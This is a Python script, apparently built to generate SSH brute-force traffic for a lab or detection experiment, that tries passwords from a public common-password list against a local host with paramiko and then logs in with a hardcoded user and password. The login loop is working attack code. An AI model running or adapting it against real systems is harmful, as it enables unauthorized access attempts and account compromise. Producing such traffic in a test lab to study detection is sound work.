# brute force ssh

from datetime import datetime, timedelta
from time import sleep
from typing import *
from urllib import request

import paramiko

# ----- CONFIGURATION ----- #

REMOTE_IP_TO_SSH = "192.168.1.78"  # IP to connect to with SSH
USERNAME = "martin"  # Username we will use for SSH authentication.
REAL_PASSWORD = "martin" #"PS4T-cyb3r-G3N14L"  # Password of the above user, for authentication. It will be attempted after the main loop.

PASSWORDS_LIST_URL = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"
DURATION_SECONDS = 30  # Total duration of the experience. The real duration may be a bit longer.
SSH_PORT = 22  # It is always 22, no?
INTERVAL_BETWEEN_ATTEMPTS = 0.0 # If >= 0 then it is a duration (in seconds) between each attempt to SSH.

# ----- PREPARATIONS ----- #

def prepare_ssh_client() -> paramiko.SSHClient:
    client = paramiko.SSHClient()
    client.load_system_host_keys()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    return client

def do_ssh_attempt_doomed_to_fail(ip: str, port: int, username: str, password: str):
    with prepare_ssh_client() as client:
        try:
            client.connect(hostname=ip, port=port, username=username, password=password)
            raise RuntimeError("It should have failed.")
        except paramiko.AuthenticationException as exc:
            pass

def run_brute_force_ssh(ip: str, username: str=USERNAME, real_password: str=REAL_PASSWORD, duration_seconds: int=DURATION_SECONDS):
    global REMOTE_IP_TO_SSH, USERNAME, REAL_PASSWORD, DURATION_SECONDS
    REMOTE_IP_TO_SSH = ip
    USERNAME = username
    REAL_PASSWORD = real_password
    DURATION_SECONDS = duration_seconds

    with request.urlopen(PASSWORDS_LIST_URL) as f:
        pwd_list: List[str] = f.read().decode("utf-8").split("\n")
    print(f"Received a file of {len(pwd_list)} lines.")
    assert(len(pwd_list))

    # ----- Initial test to ensure everything is okay ----- #

    print(f"Ready to test SSHClient for first time!")
    loop_counter = -1

    do_ssh_attempt_doomed_to_fail(ip=REMOTE_IP_TO_SSH, port=SSH_PORT, username=USERNAME, password=pwd_list[0])
    # If it fails, the client is closed and the raised exception will stop the script.
    # It indicates that there is a problem of configuration, for example wrong IP.

    # ----- MAIN LOOP ----- #

    print(f"Everything is ready, start the attack. Duration={DURATION_SECONDS}s.")
    TARGET_TIME = datetime.now() + timedelta(seconds=DURATION_SECONDS)
    time_is_up = False
    while not time_is_up:
        for password in pwd_list:
            loop_counter += 1
            if datetime.now() >= TARGET_TIME:
                time_is_up = True
                break

            do_ssh_attempt_doomed_to_fail(ip=REMOTE_IP_TO_SSH, port=SSH_PORT, username=USERNAME, password=password)

            if INTERVAL_BETWEEN_ATTEMPTS:
                sleep(INTERVAL_BETWEEN_ATTEMPTS)
    print(f"End of loop after {loop_counter} requests.")

    # ----- SUCCESSFUL REQUEST ----- #

    print(f"Finally we do one final SSH request which shall succeed.")
    with prepare_ssh_client() as client:
        client.connect(hostname=f"{REMOTE_IP_TO_SSH}", port=SSH_PORT, username=USERNAME, password=REAL_PASSWORD)
        txt_stdin, txt_stdout, txt_stderr = client.exec_command("echo Hello, World!")
        output: str = txt_stdout.readlines()[0].strip()
        if not output == "Hello, World!":
            raise RuntimeWarning(f"Something failed! A simple 'echo Hello, World!' produced an unexpected output: '{output}'")

    # ----- END ----- #

    print(f"End of script.")
